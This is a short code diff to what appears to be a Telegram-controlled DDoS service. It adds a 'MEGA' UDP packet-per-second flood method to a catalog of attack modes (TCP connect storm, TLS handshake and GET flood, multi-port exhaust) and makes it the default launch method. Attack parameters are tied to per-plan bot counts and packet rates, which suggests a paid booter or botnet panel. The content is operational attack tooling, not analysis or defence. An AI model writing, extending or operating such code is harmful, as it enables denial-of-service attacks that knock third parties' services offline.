@@ -29,6 +29,7 @@ import traceback
 
 # ── Catalog ───────────────────────────────────────────────────────────────
 METHOD_CATALOG: Dict[str, Dict[str, str]] = {
+    "MEGA": {"icon": "💥", "desc": "UDP PPS sendmmsg (base-style)"},
     "PSPE": {"icon": "🎯", "desc": "Multi-port protocol exhaust"},
     "TCP":  {"icon": "🔌", "desc": "Connect storm + hold"},
     "TLS":  {"icon": "🔐", "desc": "Handshake + GET flood"},
@@ -731,7 +732,7 @@ async def _launch_from_text(update: Update, user: User, ts: TelegramSession, tex
         return
 
     data = dict(ts.data or {})
-    method = _normalize_method(data.get("method") or "PSPE")
+    method = _normalize_method(data.get("method") or "MEGA")
     duration = int(data.get("duration") or 60)
     do_scan = bool(data.get("scan"))
 
@@ -796,7 +797,7 @@ async def _launch_from_text(update: Update, user: User, ts: TelegramSession, tex
             duration_secs=duration,
             pps_per_bot=plan.max_pps_per_bot or 100000,
             bot_count=max(1, plan.max_concurrent or 1),
-            mega_mode=(method == "PSPE"),
+            mega_mode=(method == "MEGA"),
             tls_exhaust=(method == "TLS"),
             scan_ports=do_scan,
         )
